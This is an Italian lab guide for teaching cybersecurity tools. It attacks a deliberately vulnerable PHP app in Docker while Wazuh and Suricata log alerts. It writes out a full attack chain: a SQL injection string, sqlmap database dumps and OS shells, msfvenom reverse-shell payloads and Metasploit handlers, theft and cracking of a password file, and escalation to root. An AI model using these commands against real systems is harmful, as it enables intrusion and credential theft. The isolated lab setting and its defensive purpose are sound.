# Laboratorio IIoT - Cybersecurity Tools
Laboratorio sull'uso di strumenti di Cybersecurity:
- Wazuh
- Suricata
- Kali Linux
- nmap
- sqlmap
- ZAP Proxy
- Metasploit
- John The Ripper

### Prerequisiti
- `Docker`: guida installazione disponibile a questo [link](https://docs.docker.com/engine/install/ubuntu/)
- clonare questo repository:
    ```bash
    git clone https://github.com/marc-etti/lab-cybersecurity-tools.git
    ```
## 1. Wazuh
- Scarichiamo `Wazuh server` (versione 4.7.3):
    ```bash
    git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.3
    ```
- Lanciamo wazuh single-node:
    ```bash
    cd wazuh-docker/single-node
    ```
    ```bash
    docker compose -f generate-indexer-certs.yml run --rm generator
    docker compose up -d
    ```

## 2. WebApp with Wazuh
- Apriamo la macchina Web App + strumenti difesa
- IP dovrebbe essere 172.17.0.2
- verificare che se non lo è alcuni comandi sono da cambiare
- Lanciare il comando e lasciare aperto il terminale
    ```bash
    cd web-application-with-wazuh
    ```
    ```bash
    docker build -t mywebappphpwazuh . \
        && docker run --rm -it --cap-add=net_admin \
        --name mywebappphpwazuh \
        --cap-add=net_raw mywebappphpwazuh
    ```

## 3. Wazuh Dashboard
- Wazuh dashboard all'indirizzo https://127.0.0.1/
    - user: admin
    - password: SecretPassword
- Sulla dashboard di Wazuh fare click su:
    1. "Total agents"
    2. "agente47-webserver-wazuh"
    3. "Security events"
    4. "Events" per vedere gli alert.
- In questo momento vediamo solo alert riguardo la compliance con CIS Benchmark.

## 4. Web App Vulnerabile
- Visitiamo il sito Web http://172.17.0.2
- Navigare il sito e testarne le funzionalità:
    - Login
    - Ricerca ticket
    - Inserimento ticket

## 5. Kali Linux
- Ci spostiamo all'interno della cartella `kali` e lanciamo il container con Kali Linux:
    ```bash
    cd kali
    ```
    ```bash
    docker build -t kali . && docker run --rm -it --privileged --name kali kali
    ```
- Una volta finito il deploy del container, tenere quel terminale aperto

## 6. nmap
- Dal terminale con kali facciamo partire una scansione con `nmap` verso la nostra web app vulnerabile all'indirizzo `172.17.0.2`:
    ```bash
    nmap -T4 -A 172.17.0.2
    ```
- L'output del comando mostra:
    - `80/tcp open http`: il target espone Apache HTTP
    - `PHPSESSID httponly flag not set`: Cookie di sessione leggibile da JavaScript, possibile furto sessione in caso di XSS
    - `.git/ Git repository found`: Repository Git esposto (Source code disclosure)
    - `Apache/2.4.18 Ubuntu`: Versione server esposta
- Dopo la scansione, apriamo Wazuh e osserviamo se Suricata/Wazuh ha generato alert relativi a port scanning (Security Events > Events)
- se non si è impostato l'autorefresh, cliccare il pulsante aggiorna in alto a destra

## 7. ZAP
- Apriamo un nuovo terminale e lanciamo ZAP proxy containerizzato:
    ```bash
    docker run -u zap -p 8080:8080 -p 8090:8090 \
        --name zap \
        -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh
    ```
- Accediamo a ZAP all'URL: http://localhost:8080/zap
- Facciamo la scansione automatica della web app `172.17.0.2`:
    1. Click su Automated Scan
    2. URL to Attack: http://172.17.0.2
    3. Use ajax spider: If Modern with Firefox Headless
    4. Click su Attack
    5. Attendiamo la fine di tutte le fasi della scansione automatizzata (Spider, Spider AJAX e Active Scan)
- Nella sezione alert di ZAP notiamo che ha rilevato XSS e SQL Injection
- Dalla dashboard di Wazuh notiamo che Suricata ha rilevato la scansione automatica,
- specie gli alert per SQL Injection (Security Events > Events)

- (Opzionale) andiamo sul sito e proviamo a mano la SQL Injection nel campo della ricerca ticket: `' OR 1=1 -- -`

## 8. sqlmap
- Torniamo sul terminale con Kali e usiamo sqlmap per verificare la SQL Injection:
    ```bash
    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" --batch
    ```
    - sqlmap conferma che il parametro GET `text` è vulnerabile a SQL Injection.
    - L’output indica inoltre che il backend usa `MySQL >= 5.1` 
e che il server web è basato su `Apache 2.4.18, PHP, Linux Ubuntu 16.04/16.10`

- Con sqlmap guardiamo i database sul sistema remoto:
    ```
    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" --batch --dbs
    ```
    4 database disponibili:
    - cyberbase
    - information_schema (database di sistema)
    - mysql (database di sistema)
    - performance_schema (database di sistema)

- Con sqlmap guardiamo lo schema del DB `cyberbase`:
    ```bash
    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" --batch -D cyberbase --schema
    ```
    L’output mostra che sqlmap ha enumerato lo schema del database cyberbase, cioè tabelle e colonne presenti. Sono state trovate 3 tabelle:
    - cyberbase.tickets
    - cyberbase.admin
    - cyberbase.users
- Con sqlmap effettuiamo il dump di tutti i contenuti del DB `cyberbase`:
    ```
    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" -D cyberbase --dump-all
    ```
    - Premiamo sempre `invio` per utilizzare le impostazioni di default
    - Il risultato più rilevante è nella tabella admin, dove sono state trovate le credenziali dell'admin:
        ```
        +---------------------------------------------------+---------------+
        | password                                          | username      |
        +---------------------------------------------------+---------------+
        | 36a2930dae16f82885cc78fc5bc8bf5a (Administrator1) | administrator |
        +---------------------------------------------------+---------------+
        ```
    - La password era salvata come hash MD5: `36a2930dae16f82885cc78fc5bc8bf5a`
    - e sqlmap è riuscito a craccarla automaticamente con un attacco a dizionario: `Administrator1`

- Ottenute le credenziali dell'amministratore, ci logghiamo sul sito come `administrator`
- Abbiamo accesso al "pannello di controllo" (http://172.17.0.2/admin/login.php)

- Notiamo su Wazuh gli alert relativi alla SQL Injection (Security Events > Events)

- Con sqlmap otteniamo una bind shell sul sistema operativo
    ```
    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" --os-shell
    ```
    - quando chiede di selezionare l'architettura, scegliere `32-bit`
    - comandi da provare nella os-shell: `whoami`, `id`, `pwd`.
    - per uscire dalla os-shell usare `exit`.

## 9. Metasploit
- Con sqlmap otteniamo una reverse shell di Metasploit sul sistema operativo:
    ```
    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" --os-pwn
    ```
    - quando lo chiede di selezionare l'architettura, scegliere `32-bit`
    - le altre opzioni le lasciamo di default
- quando compare: `[*] Command shell session 1 opened (172.17.0.3:21531 -> 172.17.0.2:49202) at 2026-05-11 12:33:21 +0000` lanciamo dei comandi per verificare che la shell sia attiva e funzionante (`ls`, `whoami`)
- Mettiamo in background la sessione:
    ```
    background
    ```
- Eseguiamo l'upgrade della sessione:
    ```
    sessions -u 1
    ```

- Apriamo un nuovo terminale Kali:
    ```
    docker exec -it $(docker ps -a | grep kali | awk '{print $1}') bash
    ```
- Creiamo un payload con `msfvenom`:
    ```
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.17.0.3 LPORT=5555 -f elf > shell.elf
    ```
    - Nota: in questo caso l'IP del container Kali è 172.17.0.3, se non lo è, modificare di conseguenza.
- Usiamo la sessione 2 (quella con Meterpreter) per fare l'upload e rendere eseguibile il file `shell.elf`:
    ```
    sessions -i 2
    upload shell.elf /var/lib/mysql
    shell
    ls -l
    chmod +x shell.elf
    ls -l
    ```
    - Verifichiamo con `ls -l` che siano stati attribuiti i permessi di esecuzione

- Usciamo da questa istanza di Metasploit (per uscire usare `exit` e `exit -y` finchè non usciamo del tutto da Metasploit)
- Apriamo una nuova istanza di Metasploit e prepariamo Metasploit per ricevere una connessione reverse Meterpreter da una macchina Linux 32-bit:
    ```
    msfconsole
    use exploit/multi/handler
    set payload linux/x86/meterpreter/reverse_tcp
    setg lhost 172.17.0.3
    set lport 5555
    show options
    exploit
    ```
- Si mette in attesa della connessione

- In un altro terminale Kali usiamo sqlmap per eseguire la shell:
    ```
    sqlmap -u "http://172.17.0.2/searchedTickets.php?text=a" --os-cmd '/var/lib/mysql/shell.elf'
    ```
- Otteniamo la reverse shell Meterpreter, possiamo chiudere la shell di sqlmap tenendo aperto il terminale Kali.

- Cerchiamo i file contenenti la parola "password" con Meterpreter:
    ```
    search -f *password*
    ```
- Notiamo `/home/gb/passwords.txt`, lo scarichiamo:
    ```
    download /home/gb/passwords.txt
    ```
- Apriamo un nuovo terminale Kali, eseguiamo il cat del file:
    ```
    cat passwords.txt
    ```
    - È `$6$A0vR7352$oUSgVZnx0TLp6JqqfFa7tYK.d4S4MfBG4txFf09kj9XErxLAjP8dcDSDKTh3XKClfMLU8h5PDRBzIJryXZNOv1`
- Salviamo l'hash in hashes.txt:
    ```
    echo 'gb:<hash_della_password>' > hashes.txt
    ```
    - controlliamo con `cat hashes.txt`
 

## 10. John the Ripper
- Usiamo John the Ripper per craccare la password:
    ```
    john --format=crypt hashes.txt
    ```

- Torniamo sul terminale con Metasploit aperto, mettiamo in background la sessione Meterpreter, configuriamo ed eseguiamo l'exploit `su_login`:
    ```
    background
    search su_login
    use 1 # È quello per Linux x86
    show options
    set session 1
    set username gb
    set password hunter2
    set lport 6666
    exploit
    ```
- Otteniamo l'accesso come utente gb

- Scopriamo e rubiamo i file privati:
    ```
    ls -l
    ls -lR
    download /home/gb
    ```
- Simuliamo l'invio dei log Auditd a Wazuh:
    ```
    shell
    ./create_auditd_logs.sh
    ```
- Andiamo a vedere gli alert relativi ai log di Auditd su Wazuh

## 11. Otteniamo una shell come root sul sistema
- Apriamo un nuovo terminale Kali e creiamo il payload con `msfvenom`:
    ```
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.17.0.3 LPORT=7777 -f elf > shell_root.elf
    ```
- Apriamo Metasploit, carichiamo `multi/handler` per gestire la connessione e configuriamo payload, lhost e lport:
    ```
    msfconsole
    use exploit/multi/handler
    set payload linux/x86/meterpreter/reverse_tcp
    set lhost 172.17.0.3
    set lport 7777
    show options
    exploit
    ```
    - `exploit` avvia il listener. A questo punto Metasploit aspetta che qualcuno esegua shell_root.elf su una macchina raggiungibile.

- Nel terminale con la sessione Meterpreter carichiamo il file `shell_root.elf`, lo rendiamo eseguibile ed infine lo eseguiamo come sudo:
    ```
    upload shell_root.elf /home/gb
    ls -l
    chmod +x shell_root.elf
    ls -l
    echo 'hunter2' | sudo -S ./shell_root.elf
    ```

- Nell'altro terminale otteniamo una shell come root, che possiamo verificare con i comandi: `whoami` e `id`.

- Se vogliamo guardare che ulteriore tipo di post exploitation possiamo fare:
    ```
    search type:post platform:linux
    ```

